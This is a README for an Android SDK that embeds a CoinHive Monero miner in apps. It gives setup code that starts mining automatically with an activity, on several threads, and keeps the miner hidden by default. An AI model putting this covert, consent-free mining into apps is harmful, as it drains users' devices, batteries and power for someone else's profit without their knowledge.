# Android Kotlin CoinHive SDK

Simply saying, CoinHive is a cypto miner. The Coinhive JavaScript Miner lets you embed a Monero miner directly into your website. but there wasn't any solution for android, to mine Monero from apps. So i developed one. :)

### Installation

Install the dependency.

```groovy
compile 'ro.mdc_software.coinhive:coinhive:1.0.0'
```



Add `INTERNET` permission

```xml
<uses-permission android:name="android.permission.INTERNET" />
```


Init in your application

```java
// java
public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();

        CoinHive.getInstance()
                .init("YOUR-SITE-KEY") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // To logcat mining status, false by default.
                .setForceASMJS(false); // optional

    }
}
```

```kotlin
// kotlin
class App : Application() {

    override fun onCreate() {
        super.onCreate()

        CoinHive.init("YOUR-SITE-KEY") // mandatory
                .setNumberOfThreads(4) // optional
                .setIsAutoThread(true) // optional
                .setThrottle(0.2) // optional
                .setLoggingEnabled(true) // optional
                .setForceASMJS(false) // optional
    }
}
```

Don't forget to add `App` class to your `manifest`.
Finally, extend your activities or fragments from `CoinHiveActivity` or `CoinHiveFragment` respectively


```java
// java
public class MainActivity extends CoinHiveActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        
        // Usual stuff
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
    }
```

```kotlin
// kotlin
class MainActivity : CoinHiveActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {

        // Usual stuff
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_coinhive_example)

        val toolbar = findViewById(R.id.toolbar) as Toolbar
        setSupportActionBar(toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
    }
}
```

Done. Mining will start once you start the activity and will continue until the activity get destroyed.
To control the miner visibility override `isShowMining()`, by default it's `false`. 

### Miner status

If the miner runs actively, `onRunning()` method will get called on each second.

You can override the `onMiningStarted()` and `onMiningStopped()` to get miner status.

```java
// java
class MainActivity extends CoinHiveActivity {
    
    // your program code goes here
    
    @Override
    public void onRunning(double hashesPerSecond, long totalHashes, long acceptedHashes) {

    }

    @Override
    private void onMiningStarted() {

    }

    @Override
    private void onMiningStopped() {

    }
}
```

```kotlin
// kotlin
class MainActivity : CoinHiveActivity() {

    // your program code goes here

    override fun onMiningStarted() {

    }

    override fun onMiningStopped() {

    }

    override fun onRunning(hashesPerSecond: Double, totalHashes: Long, acceptedHashes: Long) {

    }
}
```

### Miner controls

To stop the miner, you can call `stopMining()`.

To start the miner, you can call `startMining()`.

NOTE:By default, miner will start automatically.

Credit: https://github.com/theapache64

